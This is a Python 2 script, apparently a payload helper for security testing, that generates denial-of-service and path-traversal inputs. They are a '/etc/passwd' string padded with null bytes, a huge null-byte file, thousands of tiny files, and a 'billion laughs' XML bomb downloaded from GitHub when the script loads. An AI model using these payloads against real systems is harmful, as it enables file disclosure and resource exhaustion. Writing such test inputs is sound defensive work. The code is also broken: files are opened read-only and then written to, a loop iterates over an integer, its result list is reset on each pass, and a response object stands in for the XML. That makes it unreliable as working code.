#!/usr/bin/env python
import os
import urlparse

import requests

base_url = "https://raw.github.com/rahulunair/attack_payloads/"
attack_strings = {
    "null": b"\x00",
    "crafted": "/etc/passwd" + b"\x00" * (2**2),
    "tiny": b"\x00" * 2,
    "bill_xml": requests.get(urlparse.urljoin(base_url, "bill_laughs.xml"))
}


def giant_null_file(as_file=False, filename="null.bin", size=24):
    """Create a giant binary null file"""
    if as_file:
        with open(filename) as gf:
            gf.write(bytearray(attack_strings["null"]) * (2**size))
        return os.path.abspath("null.bin")
    return attack_strings["null"] * (2**size)


def mil_files(number=10):
    """Create number of tiny files"""
    for num in number:
        file_list = []
        with open(str(num) + "_file.bin") as fh:
            fh.write(attack_strings["tiny"])
        file_list.append(os.path.abspath(fh.name))
    return file_list


def crafted_binary(as_file=False):
    if as_file:
        with open("crafted.bin") as fh:
            fh.write(attack_strings["crafted"])
        return os.path.abspath("crafted.bin")
    return attack_strings["crafted"]


def billion_laughs():
    """A billion laughs xml"""
    return attack_strings["bill_xml"]
